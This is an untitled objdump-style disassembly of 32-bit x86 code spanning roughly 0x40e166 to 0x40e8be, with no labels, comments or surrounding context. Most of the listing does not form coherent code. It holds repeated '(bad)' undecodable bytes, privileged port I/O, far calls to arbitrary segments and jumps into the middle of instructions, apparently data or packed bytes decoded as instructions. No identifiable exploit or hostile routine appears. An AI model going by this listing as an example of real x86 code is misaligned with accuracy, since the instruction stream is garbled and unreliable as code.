  40e166:	outs   dx,DWORD PTR ds:[esi]
  40e167:	in     eax,dx
  40e168:	and    DWORD PTR [ecx-0x3129f673],esi
  40e16e:	xchg   ebx,eax
  40e16f:	jo     0x40e1ef
  40e171:	mov    ecx,0x3b82ad86
  40e176:	adc    al,0x61
  40e178:	rcr    BYTE PTR ds:0x5f748e85,1
  40e17e:	pop    ebx
  40e17f:	sti    
  40e180:	daa    
  40e181:	xor    al,0xa7
  40e183:	pop    ecx
  40e184:	jno    0x40e1f6
  40e186:	pop    edx
  40e187:	ds loopne 0x40e116
  40e18a:	jle    0x40e1bd
  40e18c:	push   edi
  40e18d:	inc    eax
  40e18e:	mov    ?,WORD PTR [edi-0x614b1382]
  40e194:	push   ebp
  40e195:	and    al,0xbc
  40e197:	xor    eax,ebp
  40e199:	cmp    al,0x87
  40e19b:	adc    BYTE PTR [esi+0x77ab562c],0xdd
  40e1a2:	sub    DWORD PTR [ebx+0x13ec11d1],edi
  40e1a8:	aam    0x91
  40e1aa:	(bad)  
  40e1ab:	loope  0x40e1f2
  40e1ad:	mov    dh,0x39
  40e1af:	pop    ecx
  40e1b0:	das    
  40e1b1:	fs jb  0x40e1d8
  40e1b4:	retf   0xb571
  40e1b7:	loopne 0x40e1e0
  40e1b9:	pop    ss
  40e1ba:	mov    al,BYTE PTR [edi]
  40e1bc:	test   DWORD PTR [edx],ecx
  40e1be:	dec    edx
  40e1bf:	mov    ecx,0xb0986815
  40e1c4:	loop   0x40e1fd
  40e1c6:	push   ds
  40e1c7:	sbb    al,0x47
  40e1c9:	add    al,bl
  40e1cb:	daa    
  40e1cc:	mov    eax,0x20efb6a0
  40e1d1:	push   eax
  40e1d2:	add    eax,0x2287be2a
  40e1d7:	aaa    
  40e1d8:	(bad)  
  40e1d9:	and    DWORD PTR [ebx+0x18],ebp
  40e1dc:	icebp  
  40e1dd:	test   eax,0xb3c47998
  40e1e2:	imul   esi,DWORD PTR [ecx+0x7096604],0xffffffe7
  40e1e9:	test   BYTE PTR [ebp-0x2ea12c00],al
  40e1ef:	xlat   BYTE PTR ds:[ebx]
  40e1f0:	lea    eax,[ecx+ecx*1+0x77]
  40e1f4:	mov    edi,esi
  40e1f6:	call   0x617baddc
  40e1fb:	ror    dl,0x20
  40e1fe:	sbb    BYTE PTR [edx],ah
  40e200:	jnp    0x40e25a
  40e202:	sahf   
  40e203:	xor    dl,cl
  40e205:	loope  0x40e1da
  40e207:	jb     0x40e1c3
  40e209:	cmp    esp,edi
  40e20b:	pop    esi
  40e20c:	inc    ecx
  40e20d:	idiv   cl
  40e20f:	aam    0x4e
  40e211:	push   ds
  40e212:	aad    0x13
  40e214:	pop    edi
  40e215:	lds    edi,FWORD PTR [edx+0x266cbb44]
  40e21b:	jg     0x40e237
  40e21d:	pusha  
  40e21e:	fdiv   QWORD PTR [edi-0x5c6eb0d3]
  40e224:	xchg   DWORD PTR [eax],eax
  40e226:	push   es
  40e227:	mov    dl,0x80
  40e229:	dec    ecx
  40e22a:	jle    0x40e22f
  40e22c:	mov    eax,DWORD PTR [eax-0x77]
  40e22f:	dec    edx
  40e230:	cli    
  40e231:	es ss fcomip st,st(4)
  40e235:	ins    BYTE PTR es:[edi],dx
  40e236:	daa    
  40e237:	outs   dx,DWORD PTR ds:[esi]
  40e238:	xchg   ebp,eax
  40e239:	push   ebx
  40e23a:	xor    al,0xbf
  40e23c:	cld    
  40e23d:	dec    esp
  40e23e:	inc    ebx
  40e23f:	inc    edx
  40e240:	imul   esi,DWORD PTR [edi+0x24],0xffffffaf
  40e244:	int3   
  40e245:	dec    ebx
  40e246:	jbe    0x40e22d
  40e248:	sbb    DWORD PTR [esi],esi
  40e24a:	dec    ebx
  40e24b:	popa   
  40e24c:	push   ss
  40e24d:	jae    0x40e228
  40e24f:	jo     0x40e28f
  40e251:	scas   eax,DWORD PTR es:[edi]
  40e252:	test   DWORD PTR [ebp+0x3df72814],ebx
  40e258:	or     DWORD PTR [ebp+0x80deeb],ebp
  40e25e:	stos   DWORD PTR es:[edi],eax
  40e25f:	inc    ebp
  40e260:	push   0x67
  40e262:	push   ebx
  40e263:	sub    eax,0x8369a7ad
  40e268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e269:	jno    0x40e2aa
  40e26b:	jo     0x40e26b
  40e26d:	in     al,0x4
  40e26f:	sub    dl,BYTE PTR [esi]
  40e271:	cmp    BYTE PTR [edi],0xd2
  40e274:	jnp    0x40e21a
  40e276:	test   al,0xd3
  40e278:	cmp    esp,DWORD PTR [edx-0x65]
  40e27b:	fild   WORD PTR [esi-0x46177bc5]
  40e281:	ins    BYTE PTR es:[edi],dx
  40e282:	iret   
  40e283:	call   0xc67fcfc7
  40e288:	test   dh,bh
  40e28a:	mov    ah,0xc2
  40e28c:	add    eax,0x1337c5d7
  40e291:	mov    eax,ds:0x869923e7
  40e296:	cld    
  40e297:	enter  0xa8cc,0x4f
  40e29b:	or     DWORD PTR [eax+0x61],0x3d
  40e29f:	popa   
  40e2a0:	jb     0x40e2c2
  40e2a2:	add    DWORD PTR [ecx-0x67],eax
  40e2a5:	in     eax,0xf1
  40e2a7:	dec    eax
  40e2a8:	fstp   DWORD PTR [eax+esi*1]
  40e2ab:	div    BYTE PTR [esi]
  40e2ad:	inc    ebp
  40e2ae:	aas    
  40e2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b0:	jg     0x40e318
  40e2b2:	inc    ebx
  40e2b3:	dec    ecx
  40e2b4:	call   0x1cfb85d5
  40e2b9:	ror    al,1
  40e2bb:	adc    edi,eax
  40e2bd:	retf   
  40e2be:	inc    ebx
  40e2bf:	jl     0x40e2cc
  40e2c1:	mov    esi,0x5b59b05f
  40e2c6:	xor    eax,0xf7ca7660
  40e2cb:	pop    edx
  40e2cc:	cs push cs
  40e2ce:	dec    ecx
  40e2cf:	fwait
  40e2d0:	jge    0x40e308
  40e2d2:	idiv   DWORD PTR [edx+0x4cbc0ac0]
  40e2d8:	and    DWORD PTR [ebp+0x697d8a8b],esp
  40e2de:	jecxz  0x40e2ba
  40e2e0:	jnp    0x40e361
  40e2e2:	addr16 or al,0xc5
  40e2e5:	cli    
  40e2e6:	adc    BYTE PTR [ebx-0xf7dbd32],al
  40e2ec:	jg     0x40e2e2
  40e2ee:	aam    0x13
  40e2f0:	sub    eax,0x600e3b13
  40e2f5:	aam    0x31
  40e2f7:	push   ecx
  40e2f8:	or     al,0xad
  40e2fa:	sub    dl,al
  40e2fc:	pop    ebp
  40e2fd:	mov    dh,0xe1
  40e2ff:	xor    DWORD PTR [edi-0x675131d3],ebx
  40e305:	sbb    bl,BYTE PTR [eax-0x1282da85]
  40e30b:	cmp    ch,BYTE PTR [ecx]
  40e30d:	(bad)  
  40e30e:	ja     0x40e2ab
  40e310:	js     0x40e2ef
  40e312:	mov    ds:0x95ec0375,eax
  40e317:	mov    al,BYTE PTR [eax+0x52a91c80]
  40e31d:	mov    esp,0xc28de2b0
  40e322:	inc    DWORD PTR [edi+0x457c5887]
  40e328:	push   ebx
  40e329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e32a:	ins    BYTE PTR es:[edi],dx
  40e32b:	xor    al,0x86
  40e32d:	loope  0x40e30d
  40e32f:	pop    ds
  40e330:	add    BYTE PTR [ebx+eiz*4+0x7810fab1],bl
  40e337:	aam    0x16
  40e339:	aad    0x9f
  40e33b:	xchg   edi,eax
  40e33c:	imul   esp,ebx,0x23b00a9f
  40e342:	push   esp
  40e343:	sbb    dl,ah
  40e345:	adc    DWORD PTR [edx-0x38028c4c],eax
  40e34b:	mov    ds:0xfc6f3c89,eax
  40e350:	pop    esi
  40e351:	mov    bl,0xc6
  40e353:	dec    esp
  40e354:	pop    esi
  40e355:	push   edi
  40e356:	jecxz  0x40e339
  40e358:	sbb    al,0x9e
  40e35a:	add    BYTE PTR [edi],bl
  40e35c:	out    0x47,eax
  40e35e:	repz ror BYTE PTR [ebx-0x2c],0x7d
  40e363:	mov    cl,0xbc
  40e365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e366:	mov    eax,ds:0x8450367a
  40e36b:	into   
  40e36c:	mov    al,ds:0xd314d1f6
  40e371:	lahf   
  40e372:	sub    ebx,DWORD PTR [ebp-0x2c]
  40e375:	rol    DWORD PTR [edx],cl
  40e377:	sbb    al,0xab
  40e379:	dec    edx
  40e37a:	pop    ebx
  40e37b:	jbe    0x40e380
  40e37d:	jnp    0x40e358
  40e37f:	dec    esp
  40e380:	push   0x5
  40e382:	in     eax,0xe5
  40e384:	push   ebx
  40e385:	addr16 loop 0x40e3c4
  40e388:	sti    
  40e389:	jle    0x40e39c
  40e38b:	aas    
  40e38c:	add    al,0x76
  40e38e:	jae    0x40e38a
  40e390:	enter  0x256d,0xd5
  40e394:	sbb    dh,BYTE PTR [ecx-0x2d]
  40e397:	or     ch,BYTE PTR [esi-0x2e159cb5]
  40e39d:	retf   
  40e39e:	in     eax,0xa3
  40e3a0:	sar    ebp,cl
  40e3a2:	cld    
  40e3a3:	sbb    bh,dh
  40e3a5:	xor    al,0x17
  40e3a7:	or     al,0xfe
  40e3a9:	pop    ds
  40e3aa:	xchg   ecx,eax
  40e3ab:	mov    ?,WORD PTR [esp+eiz*8]
  40e3ae:	push   cs
  40e3af:	mov    bh,0xfe
  40e3b1:	sub    esi,DWORD PTR [edi]
  40e3b3:	xor    edi,DWORD PTR [edx]
  40e3b5:	adc    eax,0xdaeb4918
  40e3ba:	mov    esp,0x52006cc0
  40e3bf:	xor    dh,bh
  40e3c1:	ja     0x40e431
  40e3c3:	cmp    cl,BYTE PTR [ebx-0x64]
  40e3c6:	outs   dx,BYTE PTR ds:[esi]
  40e3c7:	jmp    0x40e34e
  40e3c9:	pop    edx
  40e3ca:	sub    al,0xad
  40e3cc:	mov    esp,ecx
  40e3ce:	pop    ecx
  40e3cf:	push   0xffffffc1
  40e3d1:	xchg   ecx,eax
  40e3d2:	inc    ecx
  40e3d3:	in     eax,dx
  40e3d4:	and    edx,edi
  40e3d6:	ret    0x1dd5
  40e3d9:	pop    eax
  40e3da:	inc    ebx
  40e3db:	dec    edi
  40e3dc:	loopne 0x40e3b7
  40e3de:	dec    ebp
  40e3df:	ret    
  40e3e0:	xchg   esi,eax
  40e3e1:	push   edi
  40e3e2:	(bad)  
  40e3e3:	and    edi,ebp
  40e3e5:	xor    eax,0x9bc8e80c
  40e3ea:	sbb    esi,DWORD PTR [esi+0x71be008a]
  40e3f0:	xchg   esi,eax
  40e3f1:	ret    
  40e3f2:	mov    cl,BYTE PTR [ebx]
  40e3f4:	test   al,0x73
  40e3f6:	jmp    0xce2fc213
  40e3fb:	and    bh,dl
  40e3fd:	ror    dl,1
  40e3ff:	fidivr WORD PTR [eax-0x38f8448e]
  40e405:	cmc    
  40e406:	sbb    ecx,DWORD PTR [edi+0x5b]
  40e409:	xchg   BYTE PTR [eax-0x44],dh
  40e40c:	add    dh,BYTE PTR [edx-0x49df0a5a]
  40e412:	aas    
  40e413:	jecxz  0x40e433
  40e415:	sahf   
  40e416:	jae    0x40e3f9
  40e418:	inc    edi
  40e419:	and    dh,BYTE PTR [bp+di]
  40e41c:	jmp    0xd700e369
  40e421:	rol    BYTE PTR [ecx+0x431a0b79],1
  40e427:	data16 mov cl,0xd9
  40e42a:	xor    esp,DWORD PTR [edx+0x22c4d898]
  40e430:	loopne 0x40e41b
  40e432:	int    0xb9
  40e434:	sbb    DWORD PTR [edi-0x5ce8f0ad],edx
  40e43a:	push   esi
  40e43b:	inc    esp
  40e43c:	dec    esp
  40e43d:	loope  0x40e41e
  40e43f:	pop    eax
  40e440:	outs   dx,DWORD PTR ds:[esi]
  40e441:	or     dl,BYTE PTR [eax+0x11]
  40e444:	iret   
  40e445:	sahf   
  40e446:	dec    eax
  40e447:	dec    ecx
  40e448:	cmc    
  40e449:	or     eax,DWORD PTR [edi]
  40e44b:	sti    
  40e44c:	int    0x28
  40e44e:	test   BYTE PTR [eax+0x341cdd6d],dl
  40e454:	js     0x40e48b
  40e456:	lahf   
  40e457:	mov    al,0x60
  40e459:	add    al,0xd6
  40e45b:	jmp    0x40e4bb
  40e45d:	push   ecx
  40e45e:	ja     0x40e4a5
  40e460:	mov    edi,0x18307ef4
  40e465:	fcomp  st(6)
  40e467:	aad    0x34
  40e469:	fs mov ah,0xd7
  40e46c:	(bad)  
  40e46d:	push   edx
  40e46e:	fidiv  DWORD PTR [eax+0x7c]
  40e471:	or     eax,esp
  40e473:	push   ss
  40e474:	xchg   ebx,eax
  40e475:	lds    ecx,FWORD PTR [edi+0x7a8f6864]
  40e47b:	mov    dl,0x75
  40e47d:	jno    0x40e470
  40e47f:	mov    ch,BYTE PTR [esi+0x9]
  40e482:	cwde   
  40e483:	test   BYTE PTR [ebp+0x5f023f2d],0x6
  40e48a:	es inc esi
  40e48c:	test   DWORD PTR ds:0x5d357e79,ecx
  40e492:	inc    ebx
  40e493:	push   DWORD PTR [esi]
  40e495:	sub    al,0xda
  40e497:	pusha  
  40e498:	dec    edx
  40e499:	add    eax,0xdc418625
  40e49e:	push   edx
  40e49f:	in     al,0x63
  40e4a1:	pop    eax
  40e4a2:	fsubr  QWORD PTR [eax-0xd]
  40e4a5:	xchg   esi,eax
  40e4a6:	adc    DWORD PTR [edi+0x38],0xffffff99
  40e4aa:	xchg   DWORD PTR [edi-0x15],esp
  40e4ad:	xor    ch,dh
  40e4af:	scas   eax,DWORD PTR es:[edi]
  40e4b0:	mov    bh,0xea
  40e4b2:	lock es in al,dx
  40e4b5:	(bad)  
  40e4b6:	jae    0x40e439
  40e4b8:	(bad)  [ecx+0x5bd06390]
  40e4be:	test   BYTE PTR [ebp-0x31],0x12
  40e4c2:	or     BYTE PTR [edx],dh
  40e4c4:	aam    0x47
  40e4c6:	aad    0xe8
  40e4c8:	or     eax,0x96062196
  40e4cd:	sub    cl,cl
  40e4cf:	push   es
  40e4d0:	out    0xca,eax
  40e4d2:	push   es
  40e4d3:	mov    eax,ds:0x1ff201fe
  40e4d8:	dec    eax
  40e4d9:	dec    ebx
  40e4da:	out    0xa2,eax
  40e4dc:	sbb    BYTE PTR [edx+0x48189753],0x91
  40e4e3:	jae    0x40e47f
  40e4e5:	fsubr  DWORD PTR [ecx+0x46]
  40e4e8:	cdq    
  40e4e9:	pop    ss
  40e4ea:	dec    ebx
  40e4eb:	shr    BYTE PTR [edi],cl
  40e4ed:	sub    esi,DWORD PTR [ecx+0x4c]
  40e4f0:	mov    al,0xc3
  40e4f2:	daa    
  40e4f3:	push   dx
  40e4f5:	cmp    DWORD PTR [ebx-0x3c],ecx
  40e4f8:	add    BYTE PTR [edx+0x54e9bdc4],dh
  40e4fe:	retf   
  40e4ff:	jb     0x40e525
  40e501:	ds add cl,bl
  40e504:	stc    
  40e505:	cdq    
  40e506:	sbb    eax,0xef39153
  40e50b:	out    dx,al
  40e50c:	jl     0x40e571
  40e50e:	leave  
  40e50f:	mov    eax,ds:0x90ed3108
  40e514:	fiadd  WORD PTR [ebx-0x4f]
  40e517:	push   cs
  40e518:	rcl    BYTE PTR [edx],1
  40e51a:	std    
  40e51b:	sbb    DWORD PTR [ebx+0x9cf71fa],edx
  40e521:	and    ebp,DWORD PTR [ebp-0x5c]
  40e524:	inc    edi
  40e525:	clc    
  40e526:	cwde   
  40e527:	fcomp  QWORD PTR [esi]
  40e529:	push   esi
  40e52a:	dec    DWORD PTR [ebp-0x45c90afb]
  40e530:	out    dx,al
  40e531:	adc    al,BYTE PTR [eax+edx*2]
  40e534:	sub    al,0xd1
  40e536:	dec    BYTE PTR [ecx]
  40e538:	xchg   ecx,eax
  40e539:	add    ecx,DWORD PTR [esi-0x493afa36]
  40e53f:	mov    edx,0xa1bb8af3
  40e544:	mov    esi,edi
  40e546:	out    0xbf,eax
  40e548:	jno    0x40e594
  40e54a:	and    al,0x4a
  40e54c:	les    ecx,FWORD PTR [ecx+0x77]
  40e54f:	add    DWORD PTR [ebx-0x3d],ebp
  40e552:	call   0x31c3:0x7d281cbc
  40e559:	outs   dx,DWORD PTR ds:[esi]
  40e55a:	inc    esi
  40e55b:	dec    edi
  40e55c:	pop    ecx
  40e55d:	or     al,BYTE PTR [ebp+0x128ff836]
  40e563:	pop    esi
  40e564:	xchg   ebp,eax
  40e565:	les    esi,FWORD PTR [eax+0x40]
  40e568:	iret   
  40e569:	popf   
  40e56a:	sub    al,BYTE PTR [edx-0x6b]
  40e56d:	(bad)  
  40e56e:	jnp    0x40e5b2
  40e570:	push   esp
  40e571:	ins    DWORD PTR es:[edi],dx
  40e572:	scas   al,BYTE PTR es:[edi]
  40e573:	ds addr16 jae 0x40e574
  40e577:	inc    edi
  40e578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e579:	popa   
  40e57a:	ret    
  40e57b:	mov    DWORD PTR [ecx+0x20],ebx
  40e57e:	push   ebx
  40e57f:	mov    esi,0x5a8ddb7e
  40e584:	dec    esp
  40e585:	mov    ch,0x0
  40e587:	aad    0x10
  40e589:	push   0xe7ef0ba4
  40e58e:	aad    0xb8
  40e590:	cmc    
  40e591:	js     0x40e581
  40e593:	cmp    eax,0xe6f3c54b
  40e598:	test   BYTE PTR [edx],ch
  40e59a:	ror    BYTE PTR [ecx+0x42],0xfb
  40e59e:	jbe    0x40e601
  40e5a0:	imul   edx,DWORD PTR [ecx+0x69],0x4c
  40e5a4:	call   0x40b46f82
  40e5a9:	mov    bh,0xd3
  40e5ab:	dec    eax
  40e5ac:	sbb    ch,BYTE PTR [edi]
  40e5ae:	jmp    0x40e53a
  40e5b0:	inc    esp
  40e5b1:	dec    ebx
  40e5b2:	inc    esi
  40e5b3:	mov    esi,0x6aaa0107
  40e5b8:	faddp  st(2),st
  40e5ba:	xchg   BYTE PTR ds:0x26606a15,cl
  40e5c0:	xor    al,0x8d
  40e5c2:	cmp    BYTE PTR [eax-0x690e70a],bh
  40e5c8:	mov    al,0x65
  40e5ca:	pushf  
  40e5cb:	in     al,0xf
  40e5cd:	mov    bl,0x39
  40e5cf:	fiadd  DWORD PTR [esi]
  40e5d1:	mov    edi,0x3cbf92d5
  40e5d6:	mov    bl,0xc1
  40e5d8:	sub    DWORD PTR [edi+ecx*4+0x31],ebp
  40e5dc:	scas   al,BYTE PTR es:[edi]
  40e5dd:	aas    
  40e5de:	aad    0xf5
  40e5e0:	dec    esi
  40e5e1:	push   ebx
  40e5e2:	jbe    0x40e5be
  40e5e4:	jp     0x40e575
  40e5e6:	push   esi
  40e5e7:	push   ebx
  40e5e8:	aas    
  40e5e9:	es pop eax
  40e5eb:	push   cs
  40e5ec:	clc    
  40e5ed:	dec    ebx
  40e5ee:	adc    eax,0x8ca80c37
  40e5f3:	test   eax,0xd231fde2
  40e5f8:	mov    ebp,0x8dee8bb4
  40e5fd:	xor    bl,BYTE PTR [esi+0x1b0d3d]
  40e603:	aam    0x9b
  40e605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e606:	push   edx
  40e607:	pop    ebp
  40e608:	rcr    cl,0x61
  40e60b:	mov    al,0x3
  40e60d:	stos   BYTE PTR es:[edi],al
  40e60e:	fmul   QWORD PTR [eax+0x33]
  40e611:	stos   BYTE PTR es:[edi],al
  40e612:	inc    esi
  40e613:	dec    ebx
  40e614:	adc    edx,DWORD PTR [esp+esi*1]
  40e617:	inc    eax
  40e618:	call   esp
  40e61a:	or     edx,DWORD PTR [edi]
  40e61c:	retf   0x50c3
  40e61f:	sub    eax,0x26d8e19a
  40e624:	outs   dx,BYTE PTR ds:[esi]
  40e625:	je     0x64cf64ac
  40e62b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e62c:	push   esp
  40e62d:	shr    bh,0x4e
  40e630:	and    eax,0x2ea6cef2
  40e635:	fistp  QWORD PTR [ebp+0x4401e188]
  40e63b:	fnstsw WORD PTR [eax+0x11]
  40e63e:	push   ecx
  40e63f:	cmp    eax,0x5ee3def
  40e644:	sbb    esp,edi
  40e646:	in     al,0xf2
  40e648:	and    al,0x84
  40e64a:	(bad)  
  40e64b:	cmp    eax,0x9dfaab94
  40e650:	push   ecx
  40e651:	cli    
  40e652:	or     eax,0x604fdf0e
  40e657:	inc    esp
  40e658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e659:	fsub   QWORD PTR [edi]
  40e65b:	cs ret 
  40e65d:	push   ecx
  40e65e:	cmp    al,0x73
  40e660:	scas   eax,DWORD PTR es:[edi]
  40e661:	sbb    DWORD PTR [esi+edx*2-0x5454fc76],0x674adae7
  40e66c:	mov    al,ds:0x5e446171
  40e671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e672:	cmp    al,0xb7
  40e674:	dec    ebp
  40e675:	and    eax,0xd23205b6
  40e67a:	add    eax,0xbc1b6634
  40e67f:	loope  0x40e6ec
  40e681:	dec    edx
  40e682:	fcmovnu st,st(3)
  40e684:	pop    ds
  40e685:	test   eax,0x7bf7d91d
  40e68a:	aas    
  40e68b:	scas   al,BYTE PTR es:[edi]
  40e68c:	pop    ss
  40e68d:	mov    edi,0x7f80c350
  40e692:	fisub  WORD PTR [ebx+0x76]
  40e695:	or     ch,al
  40e697:	and    ebp,DWORD PTR [edx-0x41]
  40e69a:	jb     0x40e63d
  40e69c:	mov    ah,0x95
  40e69e:	mov    edx,0x2970e3fb
  40e6a3:	std    
  40e6a4:	in     eax,0xbb
  40e6a6:	call   0xa2cf:0x48fd5e9e
  40e6ad:	add    eax,0xf0a94fbd
  40e6b2:	pop    edx
  40e6b3:	and    BYTE PTR [edi+0x320f67db],0x2b
  40e6ba:	push   ds
  40e6bb:	jae    0x40e689
  40e6bd:	mov    gs,esp
  40e6bf:	xlat   BYTE PTR ds:[ebx]
  40e6c0:	cli    
  40e6c1:	ins    BYTE PTR es:[edi],dx
  40e6c2:	in     eax,0x35
  40e6c4:	push   es
  40e6c5:	mov    eax,ds:0x1ddf481f
  40e6ca:	mov    ah,0x4c
  40e6cc:	ss or  al,0x3
  40e6cf:	bound  edx,QWORD PTR [esi+0x36]
  40e6d2:	cmp    dl,BYTE PTR [eax]
  40e6d4:	or     eax,0xb904f0eb
  40e6d9:	ss pusha 
  40e6db:	and    DWORD PTR [edi-0x64],ebp
  40e6de:	mov    dl,0x1e
  40e6e0:	and    BYTE PTR [eax],ch
  40e6e2:	test   DWORD PTR [ebx],esi
  40e6e4:	cmp    dh,BYTE PTR [edx-0x22e4a2f4]
  40e6ea:	lds    ecx,FWORD PTR [ebp+eiz*8+0x4bfa1a3b]
  40e6f1:	jmp    0x40e6e4
  40e6f3:	int    0x27
  40e6f5:	adc    BYTE PTR [ebp-0x17103d51],cl
  40e6fb:	retf   0xe65d
  40e6fe:	fcom   DWORD PTR [ecx]
  40e700:	int    0x5f
  40e702:	inc    edx
  40e703:	inc    edi
  40e704:	and    eax,DWORD PTR [eax-0x12]
  40e707:	xor    ebp,ebp
  40e709:	push   ds
  40e70a:	lock loopne 0x40e6f4
  40e70d:	cmp    bh,BYTE PTR [esi]
  40e70f:	std    
  40e710:	int    0xeb
  40e712:	pop    edi
  40e713:	les    edi,FWORD PTR [eax]
  40e715:	shl    DWORD PTR [ecx],cl
  40e717:	mov    al,ds:0x34217c7
  40e71c:	lea    eax,[ebx+0x2d]
  40e71f:	cmp    al,0x83
  40e721:	push   cs
  40e722:	xchg   edi,eax
  40e723:	inc    eax
  40e724:	or     BYTE PTR [eax-0x2ef9159e],0x2a
  40e72b:	dec    ebx
  40e72c:	inc    esi
  40e72d:	cmc    
  40e72e:	and    esp,DWORD PTR [edx+0x4dc4ce49]
  40e734:	sub    al,0xfd
  40e736:	xor    eax,0xbb5c4297
  40e73b:	jle    0x40e765
  40e73d:	mov    edx,0x49fb577d
  40e742:	lahf   
  40e743:	retf   
  40e744:	stos   DWORD PTR es:[edi],eax
  40e745:	mov    ah,0x14
  40e747:	xlat   BYTE PTR ds:[ebx]
  40e748:	(bad)  
  40e74a:	push   esi
  40e74b:	push   es
  40e74c:	sub    al,0x81
  40e74e:	ror    ecx,0x0
  40e751:	xor    DWORD PTR [ebx+ebp*8],0xffffff82
  40e755:	mov    ds:0x6c7e51c7,eax
  40e75a:	sar    cl,0xee
  40e75d:	dec    esp
  40e75e:	aas    
  40e75f:	lods   eax,DWORD PTR ds:[esi]
  40e760:	inc    esp
  40e761:	shr    eax,0x7c
  40e764:	addr16 daa 
  40e766:	xchg   edi,eax
  40e767:	sub    eax,0x51a487f0
  40e76c:	cmp    bh,BYTE PTR [ebx+esi*1+0x5ad34d2]
  40e773:	jmp    0x48ee:0x68bd04da
  40e77a:	pop    edx
  40e77b:	adc    ebx,DWORD PTR [eax-0x71]
  40e77e:	or     bh,bh
  40e780:	std    
  40e781:	jbe    0x40e77a
  40e783:	and    eax,0xe89b5362
  40e788:	pop    edx
  40e789:	mov    BYTE PTR [edx+0x3c5aa996],ah
  40e78f:	inc    edi
  40e790:	jb     0x40e7f9
  40e792:	sbb    BYTE PTR [edx],dh
  40e794:	sub    esi,DWORD PTR [edi+0x24]
  40e797:	loopne 0x40e733
  40e799:	daa    
  40e79a:	sbb    dh,0xc9
  40e79d:	jle    0x40e74d
  40e79f:	fucom  st(7)
  40e7a1:	ret    
  40e7a2:	(bad)  
  40e7a4:	retf   0x318e
  40e7a7:	das    
  40e7a8:	ins    BYTE PTR es:[edi],dx
  40e7a9:	in     eax,dx
  40e7aa:	into   
  40e7ab:	fs stc 
  40e7ad:	push   ss
  40e7ae:	jae    0x40e7d6
  40e7b0:	and    BYTE PTR gs:[eax],cl
  40e7b3:	mov    ah,0xb8
  40e7b5:	cmp    eax,0xa45d8214
  40e7ba:	add    DWORD PTR [edx+0x2],esp
  40e7bd:	mov    ds:0x700ee53e,eax
  40e7c2:	dec    esi
  40e7c3:	add    BYTE PTR [edx],bl
  40e7c5:	pop    es
  40e7c6:	outs   dx,BYTE PTR ss:[esi]
  40e7c8:	imul   ebp,ebx,0x2b
  40e7cb:	add    DWORD PTR [ecx],ebx
  40e7cd:	mov    bl,BYTE PTR [ecx+0x61367997]
  40e7d3:	push   esp
  40e7d4:	fiadd  DWORD PTR [esi-0x2e]
  40e7d7:	outs   dx,BYTE PTR ds:[esi]
  40e7d8:	xchg   ecx,eax
  40e7d9:	add    al,0x5d
  40e7db:	aad    0xdb
  40e7dd:	sar    DWORD PTR [ecx-0x58],0x3f
  40e7e1:	push   ebp
  40e7e2:	and    eax,0xb4e0e112
  40e7e7:	bound  edx,QWORD PTR [ebp-0x6a9b1523]
  40e7ed:	xchg   ecx,eax
  40e7ee:	and    ah,ch
  40e7f0:	jl     0x40e779
  40e7f2:	jnp    0x40e861
  40e7f4:	sbb    dh,BYTE PTR [esi+eax*4+0xea2ff04]
  40e7fb:	psubd  mm5,QWORD PTR [esi+0x6d35a92b]
  40e802:	adc    al,ch
  40e804:	sub    edi,ebp
  40e806:	call   0x5fe8:0xbb64aa82
  40e80d:	into   
  40e80e:	stos   DWORD PTR es:[edi],eax
  40e80f:	or     eax,0x6911f625
  40e814:	mov    esi,0x244fd3d1
  40e819:	daa    
  40e81a:	inc    ebx
  40e81b:	outs   dx,BYTE PTR ds:[esi]
  40e81c:	shl    DWORD PTR [edx],1
  40e81e:	mov    dh,0xa1
  40e820:	sub    eax,0x76f44e8c
  40e825:	xor    ecx,DWORD PTR [edi]
  40e827:	push   ecx
  40e828:	jb     0x40e822
  40e82a:	sub    DWORD PTR ds:0x9fbf088c,eax
  40e830:	icebp  
  40e831:	pushf  
  40e832:	fstp   QWORD PTR [edx]
  40e834:	imul   esi,DWORD PTR [ebx+0x7e87c169],0xffffffc6
  40e83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e83c:	pop    ds
  40e83d:	fcomp  QWORD PTR [esi]
  40e83f:	pop    esp
  40e840:	aad    0xb0
  40e842:	jno    0x40e7f6
  40e844:	xor    cl,dl
  40e846:	add    ah,BYTE PTR [eax+0x8]
  40e849:	dec    edx
  40e84a:	stc    
  40e84b:	push   edx
  40e84c:	sti    
  40e84d:	(bad)  
  40e84e:	jo     0x40e808
  40e850:	mov    edi,0xd7c8b574
  40e855:	gs jp  0x40e8d7
  40e858:	jns    0x40e8d3
  40e85a:	ja     0x40e868
  40e85c:	mov    ?,eax
  40e85e:	add    dh,BYTE PTR [edx-0x27c2b9f6]
  40e864:	or     DWORD PTR [edx-0x59a3d7f5],esi
  40e86a:	jmp    0x40e814
  40e86c:	(bad)  
  40e86d:	mov    bh,0xf3
  40e86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e870:	xor    BYTE PTR [edx+0x85a1510],bh
  40e876:	data16 loop 0x40e835
  40e879:	movd   mm2,ebp
  40e87c:	pop    eax
  40e87d:	ja     0x40e843
  40e87f:	xchg   esi,eax
  40e880:	mov    BYTE PTR [ebp+0x59],al
  40e883:	je     0x40e878
  40e885:	mov    ebx,0x1b0e0349
  40e88a:	popf   
  40e88b:	popf   
  40e88c:	mov    esp,0x3f57cec1
  40e891:	mov    ebx,0xa1d64758
  40e896:	pop    esp
  40e897:	mov    dh,0xe5
  40e899:	jns    0x40e8fd
  40e89b:	leave  
  40e89c:	push   0xe368c38c
  40e8a1:	daa    
  40e8a2:	mov    esi,0xb7d6e05a
  40e8a7:	std    
  40e8a8:	push   edi
  40e8a9:	xchg   esi,eax
  40e8aa:	sbb    al,BYTE PTR [esp+esi*8-0x59]
  40e8ae:	repz int3 
  40e8b0:	cmp    BYTE PTR [edi+0x148e874f],bl
  40e8b6:	mov    ebx,0x248dd1f4
  40e8bb:	lahf   
  40e8bc:	clc    
  40e8bd:	in     al,dx
  40e8be:	out    dx,al
